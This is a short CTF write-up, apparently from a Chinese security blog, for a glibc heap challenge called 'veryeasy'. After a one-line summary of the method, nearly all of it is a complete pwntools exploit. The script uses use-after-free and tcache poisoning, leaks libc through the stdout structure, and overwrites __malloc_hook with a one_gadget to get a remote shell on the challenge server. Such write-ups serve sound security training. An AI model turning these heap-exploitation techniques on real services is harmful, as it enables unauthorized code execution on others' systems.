dycb veryeasy

Apr1L's blog

pwn › wp
pwn, stdout, uaf

通过溢出可以拥有足够的 free 次数；然后通过 stdout 来leak libc，覆写 malloc_hook 为 one_gadget。

from pwn import *

#context.log_level = 'debug'

#p = process('./veryeasy')
p = remote('122.112.225.164','10001')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#gdb.attach(p)

def create(idx,size,con):
    p.sendlineafter('choice :',str(1))
    p.sendlineafter('id:',str(idx))
    p.sendlineafter('size:',str(size))
    p.sendafter('content:',con)


def edit(idx,con):
    p.sendlineafter('choice :',str(2))
    p.sendlineafter('id:',str(idx))
    p.sendafter('content:',con)

def dele(idx):
    p.sendlineafter('choice :',str(3))
    p.sendlineafter('id:',str(idx))


create(0,0xe0,'a')
create(1,0x50,'a')
for i in range(9):
    create(i+2,0xf8,'a')

dele(2)
edit(2,'a'*0x10+p64(0)+p64(0x4e1))
dele(2)
edit(6,'a'*0xf0+p64(0x4e0))
edit(2,'\xd0')
create(11,0xf8,'a')
create(12,0xf8,'a')
dele(12)
create(13,0xa0,'a')
dele(1)
dele(1)
edit(1,'\xd0')
edit(13,'\x60\x07')
create(14,0x50,'a')
create(15,0x50,'a')
create(16,0x50,p64(0xfbad1800) + p64(0)*3 + "\x00")
addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base = addr - 0x3ed8b0
p.info("libc_base==>" + hex(libc_base))
malloc_hook = libc_base+libc.sym['__malloc_hook']
realloc = libc_base+libc.sym['__libc_realloc']
malloc = libc_base + libc.sym['__libc_malloc']

dele(3)
edit(3,p64(malloc_hook-8))
create(17,0xf8,'a')
create(18,0xf8,p64(libc_base+0x10a45c)+p64(realloc+6))
p.sendlineafter('choice :',str(1))
p.sendlineafter('id:',str(19))
p.sendlineafter('size:',str(0x10))

#gdb.attach(p)
p.interactive()
